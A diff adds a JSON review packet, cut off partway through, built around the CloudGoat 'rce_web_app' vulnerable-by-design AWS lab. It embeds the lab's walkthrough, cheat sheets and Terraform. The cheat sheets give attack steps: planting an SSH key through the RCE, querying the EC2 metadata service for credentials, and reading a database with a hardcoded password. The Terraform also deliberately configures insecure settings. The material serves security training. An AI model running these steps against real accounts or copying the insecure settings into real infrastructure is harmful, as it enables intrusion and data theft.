@@ -1,0 +1,216 @@
+{
+  "workflow_version": "0.1",
+  "packet_sha256": "302769ba038fda16713414a302646b482f6e0b9454a34a9344228f19b05401cc",
+  "case_id": "cloudgoat:aws:rce_web_app",
+  "role": "reviewer",
+  "annotator_id": "annotator_02",
+  "human_attestation": false,
+  "completed_at": null,
+  "path_ontology": {
+    "ontology_id": "cloud_data_path_v1",
+    "version": "1.0.0",
+    "sha256": "4f0cd3b97393781e9cce1a93c7047bb45ce2eddcb62d9392ebc6cbf5c6f2e13e"
+  },
+  "source": {
+    "source_id": "cloudgoat",
+    "upstream_url": "https://github.com/RhinoSecurityLabs/cloudgoat",
+    "version_or_commit": "abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed",
+    "license": "BSD-3-Clause",
+    "provenance_level": "C",
+    "raw_artifacts": [
+      {
+        "raw_ref": "data/real_sources/raw/cloudgoat/abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/snapshot.zip",
+        "sha256": "6e93d9311b2497de5219fe388be6d16e2209c6b44c9457c9fc044c25f32a75cc"
+      }
+    ]
+  },
+  "candidate_metadata": {
+    "candidate_id": "cloudgoat:aws:rce_web_app",
+    "kind": "executable_scenario",
+    "platform": "AWS",
+    "scenario": "rce_web_app",
+    "manifest_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/manifest.yml",
+    "readme_paths": [
+      "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/README.md",
+      "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/assets/rce_app/README.md",
+      "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/cheat_sheet_lara.md",
+      "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/cheat_sheet_mcduck.md"
+    ],
+    "terraform_file_count": 11,
+    "has_cheat_sheet": false,
+    "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/",
+    "review_score": 102,
+    "independence_group": "cloudgoat-scenario:rce_web_app",
+    "runtime_observations_in_packet": 0,
+    "mapped_technique_ids": [],
+    "routing_origin": "deterministic keyword/metadata routing of pinned upstream material; not a label"
+  },
+  "source_materials": [
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/README.md",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/README.md",
+      "member_sha256": "b7dcefe7d4cc67306282ed874f8938d481bbaecf181baaf3232ee6cfb8311590",
+      "bytes": 3882,
+      "content_kind": "md",
+      "text": "# Scenario: rce_web_app\n\n**Size:** Medium\n\n**Difficulty:** Hard\n\n**Command:** `$ ./cloudgoat.py create rce_web_app`\n\n## Scenario Resources\n\n* 1 VPC with:\n  * ELB x 1\n  * EC2 x 1\n  * S3 x 3\n  * RDS x 1\n* 2 IAM Users\n\n## Scenario Start(s)\n\n1. IAM User \"Lara\"\n2. IAM User \"McDuck\"\n\n## Scenario Goal(s)\n\nFind a secret stored in the RDS database.\n\n## Summary\n\nStarting as the IAM user Lara, the attacker explores a Load Balancer and S3 bucket for clues to vulnerabilities, leading to an RCE exploit on a vulnerable web app which exposes confidential files and culminates in access to the scenario’s goal: a highly-secured RDS database instance.\n\nAlternatively, the attacker may start as the IAM user McDuck and enumerate S3 buckets, eventually leading to SSH keys which grant direct access to the EC2 server and the database beyond.\n\n## Exploitation Route(s)\n\n![Scenario Route(s)](https://www.lucidchart.com/publicSegments/view/1b75f181-4d6e-4ad7-b3fb-56dd54efab66/image.png)\n\n## Route Walkthrough - IAM User “Lara”\n\n1. As the IAM user Lara, the attacker explores the AWS environment and discovers a web application hosted behind a secured Load Balancer.\n2. The attacker then lists S3 buckets, discovering one which contains the logs for the Load Balancer.\n3. While reviewing the contents of the Load Balancer logs, the attacker sees that the web app has a secret admin page.\n4. Upon visiting the secret admin URL, the attacker discovers that the web app is vulnerable to a remote code execution (RCE) attack via a secret parameter embedded in a form.\n5. The attacker leverages this vulnerability to gain shell access on the EC2 instance hosting the web app.\n\n**Branch A**\n\n1. Now working through the EC2 instance (and therefore operating with its role's more expansive permissions), the attacker is able to access a private S3 bucket.\n2. Inside the private S3 bucket, the attacker finds a text file left behind by an irresponsible developer which contains the login credentials for an RDS database.\n3. The attacker then uses the EC2 instance to list and discover the RDS database referenced in the credentials file.\n4. Finally, the attacker is able to access the RDS database using the credentials they found and acquires the scenario's goal: the secret text stored in the RDS database!\n\n**Branch B**\n\n1. Struck by sudden inspiration, the attacker queries the EC2 metadata service and discovers the RDS database credentials and address.\n2. The attacker is then able to access the RDS database using the credentials they found and acquires the scenario's goal: the secret text stored in the RDS database!\n\nA cheat sheet for this route is available [here](./cheat_sheet_lara.md).\n\n## Route Walkthrough - IAM User “McDuck”\n\n1. The attacker explores the AWS environment and discovers they are able to list S3 buckets using their starting keys.\n2. The attacker discovers several S3 buckets, but they are only able to access one of them. Inside that one S3 bucket they find a pair of SSH keys.\n3. The attacker lists EC2 instances and finds the EC2 instance behind the Load Balancer.\n4. The attacker discovers that the SSH keys found in the S3 bucket enable the attacker to log into the EC2 instance.\n5. Now working through the EC2 instance (and therefore operating with its role instead of McDuck's), the attacker is able to discover and access a private S3 bucket.\n7. Inside the private S3 bucket, the attacker finds a text file left behind by an irresponsible developer which contains the login credentials for an RDS database.\n7. The attacker is able to list and discover the RDS database referenced in the credentials file.\n8. The attacker is finally able to access the RDB database using the credentials they found in step 6 and acquire the scenario's goal: the secret text stored in the RDS database.\n\nA cheat sheet for this route is available [here](./cheat_sheet_mcduck.md).",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/assets/rce_app/README.md",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/assets/rce_app/README.md",
+      "member_sha256": "f040dd8fcd7aec7a075a4117a662c4e49796ac86bfcbbe905749fcab195ccac5",
+      "bytes": 624,
+      "content_kind": "md",
+      "text": "# rce-web-app\nA super-simple app developed for CloudGoat's rce_web_app scenario.\n\n- Run the app via `node .`.\n- All static files are placed at */static* folder, which behaves like a file root for server: *static/foo.bar* can be accessed via *localhost:9000/foo.bar*.\n- \"Secret\" HTML page is mkja1xijqf0abo1h9glg.html.\n- Port is set via CLI argument (9000 by default) `node . 3000`\n- No need to install dependencies (no `npm install` needed), just run the command above.\n\n**Note:** the app is pre-zipped to avoid requiring `zip` on the user's computer. If you make any changes to the app files, you must also update the zip!\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/cheat_sheet_lara.md",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/cheat_sheet_lara.md",
+      "member_sha256": "58fed8388260b243ac71c6b1447276ec2b41ea5992e4b20b588ad191beae5418",
+      "bytes": 1258,
+      "content_kind": "md",
+      "text": "`aws configure --profile Lara`\n\n`aws s3 ls --profile Lara`\n\n`aws s3 ls s3://<bucket> --recursive --profile Lara`\n\n`aws s3 cp s3://<bucket>/cg-lb-logs/AWSLogs/793950739751/elasticloadbalancing/us-east-1/2019/06/19/555555555555_elasticloadbalancing_us-east-1_app.cg-lb-cgidp347lhz47g.d36d4f13b73c2fe7_20190618T2140Z_10.10.10.100_5m9btchz.log . --profile Lara`\n\n`cat 555555555555_elasticloadbalancing_us-east-1_app.cg-lb-cgidp347lhz47g.d36d4f13b73c2fe7_20190618T2140Z_10.10.10.100_5m9btchz.log`\n\n`aws elbv2 describe-load-balancers --profile Lara`\n\n`ssh-keygen -t ed25519` (An ed25519 key pair may be necessary here because using an RSA public key can get truncated in the RCE)\n\n`echo \"public ssh key\" >> /home/ubuntu/.ssh/authorized_keys`\n\n`curl ifconfig.me`\n\n`ssh -i private_key ubuntu@public.ip.of.ec2`\n\n# BRANCH A:\n\n`sudo apt-get install awscli`\n\n`aws s3 ls`\n\n`aws s3 ls s3://<bucket> --recursive`\n\n`aws s3 cp s3://<bucket>/db.txt .`\n\n`cat db.txt`\n\n`aws rds describe-db-instances --region us-east-1`\n\n`psql postgresql://<db_user>:<db_password>@<rds-instance>:5432/<db_name>`\n\n`\\dt`\n\n`select * from sensitive_information;`\n\n# BRANCH B:\n\n`curl http://169.254.169.254/latest/user-data`\n\n`psql postgresql://<db_user>:<db_password>@<rds-instance>:5432/<db_name>`\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/cheat_sheet_mcduck.md",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/cheat_sheet_mcduck.md",
+      "member_sha256": "228dad3ce00d7dd1da96bbf6f0c293e3e3ddbfba125b1b507adc0d74701ffab7",
+      "bytes": 702,
+      "content_kind": "md",
+      "text": "`aws configure --profile McDuck`\n\n`aws s3 ls --profile McDuck`\n\n`aws s3 ls s3://<bucket> --recursive --profile McDuck`\n\n`aws s3 cp s3://cg-keystore-s3-bucket-cgid6prrnaix1v/cloudgoat . --profile McDuck`\n\n`aws s3 cp s3://cg-keystore-s3-bucket-cgid6prrnaix1v/cloudgoat.pub . --profile McDuck`\n\n`aws ec2 describe-instances --profile McDuck`\n\n`chmod 400 cloudgoat`\n\n`ssh -i cloudgoat ubuntu@<ec2_ip>\n\n`sudo apt-get install awscli`\n\n`aws s3 ls`\n\n`aws s3 ls s3://<bucket> --recursive`\n\n`aws s3 cp s3://<bucket>/db.txt .`\n\n`cat db.txt`\n\n`aws rds describe-db-instances --region us-east-1`\n\n`psql postgresql://cgadmin:Purplepwny2029@<rds-instance>:5432/cloudgoat`\n\n`\\dt`\n\n`select * from sensitive_information;`\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/manifest.yml",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/manifest.yml",
+      "member_sha256": "f22d48996ce9bcc680668ef2d012a60e029ec57ca4339ac295b97496bfe2274c",
+      "bytes": 1022,
+      "content_kind": "yml",
+      "text": "---\n# The name of the scenario, alpha-numeric characters only, and underscore-separated\n- name: rce_web_app\n# The name of the author(s), comma separated\n- author: Rhino Security Labs\n# The version of the scenario, where major versions are breaking changes and minor are small fixes.\n- version: 2.1\n# Text displayed to the user when they type \"{{ scenario_name }} help\"\n- help: |\n        Starting as the IAM user Lara, the attacker explores a Load Balancer and S3 bucket for\n        clues to vulnerabilities, leading to an RCE exploit on a vulnerable web app which exposes\n        confidential files and culminates in access to the scenario’s goal: a highly-secured RDS\n        database instance.\n        Alternatively, the attacker may start as the IAM user McDuck and enumerate S3 buckets,\n        eventually leading to SSH keys which grant direct access to the EC2 server and the database\n        beyond.\n# Records the date upon which this scenario was last updated, in MM-DD-YYYY format\n- last-updated: 05-17-2024\n...",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/terraform/data.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/terraform/data.tf",
+      "member_sha256": "b9a716d9c336dd64a798a4d6453d406661f3e67e399dec8f08fd2ee83d32a2fd",
+      "bytes": 580,
+      "content_kind": "tf",
+      "text": "#AWS Account Id\ndata \"aws_caller_identity\" \"this\" {}\n\n\ndata \"aws_ami\" \"ubuntu\" {\n  most_recent = true\n  owners      = [\"amazon\"]\n\n  filter {\n    name   = \"name\"\n    values = [\"ubuntu/images/hvm-ssd-gp3/ubuntu-noble-24.04-amd64-server-*\"]\n  }\n\n  filter {\n    name   = \"architecture\"\n    values = [\"x86_64\"]\n  }\n\n  filter {\n    name   = \"root-device-type\"\n    values = [\"ebs\"]\n  }\n\n  filter {\n    name   = \"virtualization-type\"\n    values = [\"hvm\"]\n  }\n}\n\n\ndata \"archive_file\" \"app\" {\n  type        = \"zip\"\n  source_dir  = \"../assets/rce_app/\"\n  output_path = \"../assets/app.zip\"\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/terraform/ec2.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/terraform/ec2.tf",
+      "member_sha256": "e060248525ea8b0aeef79842fe588dc1d5d3cbbfc7df3bd3bf462be7a9836b36",
+      "bytes": 4881,
+      "content_kind": "tf",
+      "text": "resource \"aws_iam_role\" \"ec2\" {\n  depends_on = [\n    aws_iam_policy.ec2_rds\n  ]\n\n  name                  = \"cg-ec2-role-${var.cgid}\"\n  force_detach_policies = true\n\n  assume_role_policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Action = \"sts:AssumeRole\"\n        Principal = {\n          Service = \"ec2.amazonaws.com\"\n        }\n        Effect = \"Allow\"\n      }\n    ]\n  })\n}\n\n\nresource \"aws_iam_role_policy_attachments_exclusive\" \"ec2\" {\n  role_name = aws_iam_role.ec2.name\n  policy_arns = [\n    \"arn:aws:iam::aws:policy/AmazonS3FullAccess\",\n    aws_iam_policy.ec2_rds.arn\n  ]\n}\n\n\n#IAM Policy for EC2-RDS\nresource \"aws_iam_policy\" \"ec2_rds\" {\n  name        = \"cg-ec2-rds-policy\"\n  description = \"cg-ec2-rds-policy\"\n  policy = jsonencode({\n    Version = \"2012-10-17\"\n    Statement = [\n      {\n        Action = [\n          \"ec2:DescribeInstances\",\n          \"ec2:DescribeVpcs\",\n          \"ec2:DescribeSubnets\",\n          \"ec2:DescribeSecurityGroups\",\n          \"rds:DescribeDBInstances\"\n        ],\n        Effect   = \"Allow\"\n        Resource = \"*\"\n      }\n    ]\n  })\n}\n\n\n#IAM Instance Profile\nresource \"aws_iam_instance_profile\" \"ec2\" {\n  name = \"cg-ec2-instance-profile-${var.cgid}\"\n  role = aws_iam_role.ec2.name\n}\n\n\n#Security Groups\nresource \"aws_security_group\" \"ec2_ssh\" {\n  name        = \"cg-ec2-ssh-${var.cgid}\"\n  description = \"CloudGoat ${var.cgid} Security Group for EC2 Instance over SSH\"\n  vpc_id      = aws_vpc.this.id\n\n  ingress {\n    from_port   = 22\n    to_port     = 22\n    protocol    = \"tcp\"\n    cidr_blocks = var.cg_whitelist\n  }\n\n  egress {\n    from_port = 0\n    to_port   = 0\n    protocol  = \"-1\"\n    cidr_blocks = [\n      \"0.0.0.0/0\"\n    ]\n  }\n\n  tags = {\n    Name = \"cg-ec2-ssh-${var.cgid}\"\n  }\n}\n\nresource \"aws_security_group\" \"ec2_http\" {\n  name        = \"cg-ec2-http-${var.cgid}\"\n  description = \"CloudGoat ${var.cgid} Security Group for EC2 Instance over HTTP\"\n  vpc_id      = aws_vpc.this.id\n\n  ingress {\n    from_port = 9000\n    to_port   = 9000\n    protocol  = \"tcp\"\n    security_groups = [\n      aws_security_group.lb_http.id\n    ]\n  }\n\n  egress {\n    from_port = 0\n    to_port   = 0\n    protocol  = \"-1\"\n    security_groups = [\n      aws_security_group.lb_http.id\n    ]\n  }\n\n  tags = {\n    Name = \"cg-ec2-http-${var.cgid}\"\n  }\n}\n\n\n#AWS Key Pair\nresource \"aws_key_pair\" \"this\" {\n  key_name   = \"cg-ec2-key-pair-${var.cgid}\"\n  public_key = file(var.ssh_public_key)\n}\n\n\n#EC2 Instance\nresource \"aws_instance\" \"ubuntu\" {\n  ami                         = data.aws_ami.ubuntu.image_id\n  instance_type               = \"t3.micro\"\n  iam_instance_profile        = aws_iam_instance_profile.ec2.name\n  subnet_id                   = aws_subnet.public_1.id\n  associate_public_ip_address = true\n  key_name                    = aws_key_pair.this.key_name\n\n  vpc_security_group_ids = [\n    aws_security_group.ec2_ssh.id,\n    aws_security_group.ec2_http.id\n  ]\n\n  root_block_device {\n    volume_type           = \"gp2\"\n    volume_size           = 8\n    delete_on_termination = true\n  }\n\n  metadata_options {\n    http_endpoint               = \"enabled\"\n    http_tokens                 = \"optional\"\n    http_put_response_hop_limit = 2\n  }\n\n  provisioner \"file\" {\n    source      = data.archive_file.app.output_path\n    destination = \"/home/ubuntu/app.zip\"\n    connection {\n      type        = \"ssh\"\n      user        = \"ubuntu\"\n      private_key = file(var.ssh_private_key)\n      host        = self.public_ip\n    }\n  }\n\n  user_data = <<-EOF\n        #!/bin/bash\n        apt-get update\n        curl -sL https://deb.nodesource.com/setup_8.x | sudo -E bash -\n        DEBIAN_FRONTEND=noninteractive apt-get install -y nodejs postgresql-client unzip\n        psql postgresql://${var.rds_username}:${var.rds_password}@${aws_db_instance.postgres.endpoint}/cloudgoat \\\n        -c \"CREATE TABLE sensitive_information (name VARCHAR(50) NOT NULL, value VARCHAR(50) NOT NULL);\"\n        psql postgresql://${var.rds_username}:${var.rds_password}@${aws_db_instance.postgres.endpoint}/cloudgoat \\\n        -c \"INSERT INTO sensitive_information (name,value) VALUES ('Super-secret-passcode',E'V\\!C70RY-4hy2809gnbv40h8g4b');\"\n        sleep 15s\n        cd /home/ubuntu\n        unzip app.zip -d ./app\n        cd app\n        node index.js &\n        echo -e \"\\n* * * * * root node /home/ubuntu/app/index.js &\\n* * * * * root sleep 10; curl GET http://${aws_lb.this.dns_name}/mkja1xijqf0abo1h9glg.html &\\n* * * * * root sleep 10; node /home/ubuntu/app/index.js &\\n* * * * * root sleep 20; node /home/ubuntu/app/index.js &\\n* * * * * root sleep 30; node /home/ubuntu/app/index.js &\\n* * * * * root sleep 40; node /home/ubuntu/app/index.js &\\n* * * * * root sleep 50; node /home/ubuntu/app/index.js &\\n\" >> /etc/crontab\n        EOF\n\n  volume_tags = {\n    Name = \"CloudGoat ${var.cgid} EC2 Instance Root Device\"\n  }\n  tags = {\n    Name = \"cg-ubuntu-ec2-${var.cgid}\"\n  }\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/terraform/iam.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/terraform/iam.tf",
+      "member_sha256": "a20f88e6a6f4bebb4561bc5cd88fcd8ba99a6a43e671706a9076a92518ab0cf9",
+      "bytes": 2289,
+      "content_kind": "tf",
+      "text": "# Lara IAM User & Permissions\nresource \"aws_iam_user\" \"lara\" {\n  name = \"lara\"\n}\n\nresource \"aws_iam_access_key\" \"lara\" {\n  user = aws_iam_user.lara.name\n}\n\nresource \"aws_iam_policy\" \"lara\" {\n  name        = \"cg-lara-s3-policy\"\n  description = \"cg-lara-policy\"\n\n  policy = jsonencode({\n    Version = \"2012-10-17\",\n    Statement = [\n      {\n        Action   = \"s3:ListBucket\"\n        Effect   = \"Allow\"\n        Resource = aws_s3_bucket.logs.arn\n      },\n      {\n        Action   = \"s3:GetObject\"\n        Effect   = \"Allow\"\n        Resource = \"${aws_s3_bucket.logs.arn}/*\"\n      },\n      {\n        Action   = \"s3:ListAllMyBuckets\"\n        Effect   = \"Allow\"\n        Resource = \"*\"\n      },\n      {\n        Action = [\n          \"ec2:DescribeInstances\",\n          \"ec2:DescribeVpcs\",\n          \"ec2:DescribeSubnets\",\n          \"ec2:DescribeSecurityGroups\",\n          \"rds:DescribeDBInstances\",\n          \"elasticloadbalancing:DescribeLoadBalancers\"\n        ]\n        Effect   = \"Allow\"\n        Resource = \"*\"\n      }\n    ]\n  })\n}\n\nresource \"aws_iam_user_policy_attachment\" \"lara\" {\n  user       = aws_iam_user.lara.name\n  policy_arn = aws_iam_policy.lara.arn\n}\n\n\n\n# McDuck IAM User & Permissions\nresource \"aws_iam_user\" \"mcduck\" {\n  name = \"McDuck\"\n}\n\nresource \"aws_iam_access_key\" \"mcduck\" {\n  user = aws_iam_user.mcduck.name\n}\n\nresource \"aws_iam_policy\" \"mcduck\" {\n  name        = \"cg-mcduck-s3-policy\"\n  description = \"cg-mcduck-policy\"\n\n  policy = jsonencode({\n    Version = \"2012-10-17\",\n    Statement = [\n      {\n        Action   = \"s3:ListBucket\"\n        Effect   = \"Allow\"\n        Resource = aws_s3_bucket.keystore.arn\n      },\n      {\n        Action   = \"s3:GetObject\"\n        Effect   = \"Allow\"\n        Resource = \"${aws_s3_bucket.keystore.arn}/*\"\n      },\n      {\n        Action   = \"s3:ListAllMyBuckets\"\n        Effect   = \"Allow\"\n        Resource = \"*\"\n      },\n      {\n        Action = [\n          \"ec2:DescribeInstances\",\n          \"ec2:DescribeVpcs\",\n          \"ec2:DescribeSubnets\",\n          \"ec2:DescribeSecurityGroups\",\n          \"rds:DescribeDBInstances\"\n        ]\n        Effect   = \"Allow\"\n        Resource = \"*\"\n      }\n    ]\n  })\n}\n\nresource \"aws_iam_user_policy_attachment\" \"mcduck\" {\n  user       = aws_iam_user.mcduck.name\n  policy_arn = aws_iam_policy.mcduck.arn\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/terraform/lb.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/terraform/lb.tf",
+      "member_sha256": "76f171028796ebd771af87295c82b40165f2f24e0e0f593314185275e3b472d2",
+      "bytes": 1669,
+      "content_kind": "tf",
+      "text": "#Security Groups\nresource \"aws_security_group\" \"lb_http\" {\n  name        = \"cg-lb-http-${local.cgid_suffix}\"\n  description = \"CloudGoat ${var.cgid} Security Group for Application Load Balancer over HTTP\"\n  vpc_id      = aws_vpc.this.id\n  ingress {\n    from_port   = 80\n    to_port     = 80\n    protocol    = \"tcp\"\n    cidr_blocks = var.cg_whitelist\n  }\n\n  egress {\n    from_port = 0\n    to_port   = 0\n    protocol  = \"-1\"\n    cidr_blocks = [\n      \"0.0.0.0/0\"\n    ]\n  }\n\n  tags = {\n    Name = \"cg-lb-http-${local.cgid_suffix}\"\n  }\n}\n\n\n#Application Load Balancer\nresource \"aws_lb\" \"this\" {\n  name               = \"cg-lb-${local.cgid_suffix}\"\n  internal           = false\n  load_balancer_type = \"application\"\n  ip_address_type    = \"ipv4\"\n  access_logs {\n    bucket  = aws_s3_bucket.logs.bucket\n    prefix  = \"cg-lb-logs\"\n    enabled = true\n  }\n  security_groups = [\n    aws_security_group.lb_http.id\n  ]\n  subnets = [\n    aws_subnet.public_1.id,\n    aws_subnet.public_2.id\n  ]\n}\n\n#Target Group\nresource \"aws_lb_target_group\" \"this\" {\n  # Note: the name cannot be more than 32 characters\n  name        = \"cg-tg-${local.cgid_suffix}\"\n  port        = 9000\n  protocol    = \"HTTP\"\n  vpc_id      = aws_vpc.this.id\n  target_type = \"instance\"\n}\n\n#Target Group Attachment\nresource \"aws_lb_target_group_attachment\" \"this\" {\n  target_group_arn = aws_lb_target_group.this.arn\n  target_id        = aws_instance.ubuntu.id\n  port             = 9000\n}\n\n#Load Balancer Listener\nresource \"aws_lb_listener\" \"http\" {\n  load_balancer_arn = aws_lb.this.arn\n  port              = 80\n  default_action {\n    type             = \"forward\"\n    target_group_arn = aws_lb_target_group.this.arn\n  }\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/terraform/locals.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/terraform/locals.tf",
+      "member_sha256": "639c8ec564b1ed51096853ba64bdb6f0dcb28433a2da60729564b0b76ff21a7d",
+      "bytes": 231,
+      "content_kind": "tf",
+      "text": "locals {\n  # Ensure resource suffixes the bucket suffix doesn't contain anything else than\n  # lowercase letters, numbers, and hyphens\n  # Used for RDS, load balancer and S3\n  cgid_suffix = replace(var.cgid, \"/[^a-z0-9-]/\", \"-\")\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/terraform/outputs.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/terraform/outputs.tf",
+      "member_sha256": "51cd3bfe15457d46d4af2b520b236d11a3adde829bc5b9d49aded7618358eddc",
+      "bytes": 404,
+      "content_kind": "tf",
+      "text": "output \"cloudgoat_output_lara_access_key_id\" {\n  value = aws_iam_access_key.lara.id\n}\n\noutput \"cloudgoat_output_lara_secret_key\" {\n  value     = aws_iam_access_key.lara.secret\n  sensitive = true\n}\n\n\noutput \"cloudgoat_output_mcduck_access_key_id\" {\n  value = aws_iam_access_key.mcduck.id\n}\n\noutput \"cloudgoat_output_mcduck_secret_key\" {\n  value     = aws_iam_access_key.mcduck.secret\n  sensitive = true\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/terraform/rds.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/terraform/rds.tf",
+      "member_sha256": "099c20ed3040c14f1665c13412284875f18adc07b99004ebbe02aabb70120a23",
+      "bytes": 1400,
+      "content_kind": "tf",
+      "text": "#Security Group\nresource \"aws_security_group\" \"rds\" {\n  name        = \"cg-rds-psql-${var.cgid}\"\n  description = \"CloudGoat ${var.cgid} Security Group for PostgreSQL RDS Instance\"\n  vpc_id      = aws_vpc.this.id\n\n  ingress {\n    from_port = 5432\n    to_port   = 5432\n    protocol  = \"tcp\"\n    cidr_blocks = [\n      aws_vpc.this.cidr_block\n    ]\n  }\n\n  egress {\n    from_port = 0\n    to_port   = 0\n    protocol  = \"-1\"\n    cidr_blocks = [\n      \"0.0.0.0/0\"\n    ]\n  }\n}\n\n#RDS Subnet Group\nresource \"aws_db_subnet_group\" \"this\" {\n  name        = \"cloud-goat-rds-subnet-group-${var.cgid}\"\n  description = \"CloudGoat ${var.cgid} Subnet Group\"\n\n  subnet_ids = [\n    aws_subnet.private_1.id,\n    aws_subnet.private_2.id\n  ]\n}\n\n#RDS PostgreSQL Instance\nresource \"aws_db_instance\" \"postgres\" {\n  identifier           = \"cg-rds-instance-${local.cgid_suffix}\"\n  engine               = \"postgres\"\n  engine_version       = \"17\"\n  port                 = \"5432\"\n  instance_class       = \"db.t3.micro\"\n  db_subnet_group_name = aws_db_subnet_group.this.id\n  multi_az             = false\n  username             = var.rds_username\n  password             = var.rds_password\n  publicly_accessible  = false\n  vpc_security_group_ids = [\n    aws_security_group.rds.id\n  ]\n  storage_type        = \"gp2\"\n  allocated_storage   = 20\n  db_name             = \"cloudgoat\"\n  apply_immediately   = true\n  skip_final_snapshot = true\n}\n",
+      "copy_policy": "decoded upstream bytes; no generated content"
+    },
+    {
+      "raw_ref": "snapshot.zip#cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/terraform/s3.tf",
+      "member_path": "cloudgoat-abf1ba8f5e47d7ced750fdfa025d51c99f1a43ed/cloudgoat/scenarios/aws/rce_web_app/terraform/s3.tf",
+      "member_sha256": "dfc60d84e807526c13e0a0cbffdea691053dcbebeabdf8cb8ea51ca641088292",
+      "bytes": 2185,
+      "content_kind": "tf",
